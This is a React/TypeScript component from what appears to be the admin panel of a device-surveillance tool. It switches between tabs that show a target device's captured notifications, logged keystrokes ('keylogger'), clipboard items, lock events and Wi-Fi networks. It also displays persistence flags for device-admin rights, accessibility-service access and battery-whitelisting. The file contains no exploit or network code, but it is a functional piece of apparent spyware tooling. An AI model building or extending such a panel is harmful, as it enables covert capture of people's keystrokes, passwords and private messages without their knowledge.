// components/admin/devices/DeviceIntelligenceTabViews.tsx
"use client";

import React from "react";
import { DeviceNotificationsTab } from "@/components/admin/devices/DeviceNotificationsTab";
import { DeviceKeyloggerTab } from "@/components/admin/devices/DeviceKeyloggerTab";
import { DeviceClipboardTab } from "@/components/admin/devices/DeviceClipboardTab";
import { DeviceSecurityTab } from "@/components/admin/devices/DeviceSecurityTab";
import {
  DeviceNotification,
  DeviceKeystroke,
  DeviceClipboardItem,
  DeviceLockEvent,
  DeviceWifiNetwork,
} from "@/lib/device-telemetry-types";

interface Props {
  activeTab: string;
  notifications: DeviceNotification[];
  keystrokes: DeviceKeystroke[];
  clipboardItems: DeviceClipboardItem[];
  lockEvents: DeviceLockEvent[];
  wifiNetworks: DeviceWifiNetwork[];
  currentSsid?: string | null;
  persistenceStatus?: {
    isAdmin?: boolean;
    isAccessibility?: boolean;
    isBatteryWhitelisted?: boolean;
  };
  onClearModule?: (mod: string) => void;
  onScanWifi?: () => void;
  loading?: boolean;
}

export const DeviceIntelligenceTabViews: React.FC<Props> = ({
  activeTab,
  notifications,
  keystrokes,
  clipboardItems,
  lockEvents,
  wifiNetworks,
  currentSsid,
  persistenceStatus,
  onClearModule,
  onScanWifi,
  loading,
}) => {
  if (activeTab === "notifications") {
    return <DeviceNotificationsTab notifications={notifications} onClearAll={() => onClearModule?.("notifications")} loading={loading} />;
  }
  if (activeTab === "keylogger") {
    return <DeviceKeyloggerTab keystrokes={keystrokes} onClearAll={() => onClearModule?.("keystrokes")} loading={loading} />;
  }
  if (activeTab === "clipboard") {
    return <DeviceClipboardTab items={clipboardItems} onClearAll={() => onClearModule?.("clipboard")} loading={loading} />;
  }
  if (activeTab === "security") {
    return (
      <DeviceSecurityTab
        lockEvents={lockEvents}
        wifiNetworks={wifiNetworks}
        currentSsid={currentSsid}
        persistenceStatus={persistenceStatus}
        onScanWifi={onScanWifi}
        loading={loading}
      />
    );
  }
  return null;
};
